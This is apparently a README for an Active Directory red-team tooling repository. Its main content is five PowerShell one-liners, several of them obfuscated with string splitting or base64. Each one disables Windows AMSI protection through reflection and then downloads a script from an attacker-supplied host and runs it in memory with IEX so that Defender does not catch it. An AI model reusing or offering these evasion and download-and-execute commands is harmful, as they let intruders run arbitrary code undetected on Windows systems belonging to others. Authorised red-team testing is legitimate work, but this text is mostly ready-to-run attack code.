# About the repo:
* You'll find many tools on the internet, however, in this repo you'll find tools that may help you in your AD Red Team activities

# Download as zip or clone it:
* git clone https://github.com/projectHULK/AD_Recon.git

# Import all modules oneliner: (Windows)
* Get-Module -ListAvailable | Import-Module

# As a good practice
1) Insted of download script one-by-one, create a powershell script which will load all your tools to the system.
2) Run any AMSI bypass comand and call your script to run them in Memory 'bypassing Defender'.
* I have created Enum.ps1 which will download all the tools 'Put your IP'.
3) You can use the bellow oneliner to bypass AMSI, download Enum.ps1 and run in memory:
* Option 1)
$a = [Ref].Assembly.GetTypes();ForEach($b in $a) {if ($b.Name -like "*iUtils") {$c = $b}};$d = $c.GetFields('NonPublic,Static');ForEach($e in $d) {if ($e.Name -like "*Failed") {$f = $e}};$f.SetValue($null,$true); (new-object system.net.webclient).downloadstring('http://YourIP/Enum.ps1') | IEX
* Option 2)
(([Ref].Assembly.gettypes() | ? {$_.Name -like "Amsi*utils"}).GetFields("NonPublic,Static") | ? {$_.Name -like "amsiInit*ailed"}).SetValue($null,$true); (new-object system.net.webclient).downloadstring('http://YourIP/Enum.ps1') | IEX
* Option 3)
[Delegate]::CreateDelegate(("Func``3[String, $(([String].Assembly.GetType('System.Reflection.Bindin'+'gFlags')).FullName), System.Reflection.FieldInfo]" -as [String].Assembly.GetType('System.T'+'ype')), [Object]([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')),('GetFie'+'ld')).Invoke('amsiInitFailed',(('Non'+'Public,Static') -as [String].Assembly.GetType('System.Reflection.Bindin'+'gFlags'))).SetValue($null,$True); (new-object system.net.webclient).downloadstring('http://YourIP/Enum.ps1') | IEX
* Option 4)
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1); (new-object system.net.webclient).downloadstring('http://YourIP/Enum.ps1') | IEX
* Option 5)
[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true); (new-object system.net.webclient).downloadstring('http://YourIP/Enum.ps1') | IEX

# Note:
* Some tools my require elevated privilege

# AD Road map:
* Coming Soon
